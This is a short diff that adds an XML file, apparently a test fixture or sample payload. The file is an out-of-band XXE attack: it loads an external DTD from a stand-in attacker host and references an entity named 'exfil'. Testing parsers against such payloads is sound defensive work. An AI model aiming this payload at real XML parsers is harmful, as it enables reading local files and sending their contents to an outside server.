@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo SYSTEM "http://attacker.example.com/evil.dtd">
+<foo>&exfil;</foo>
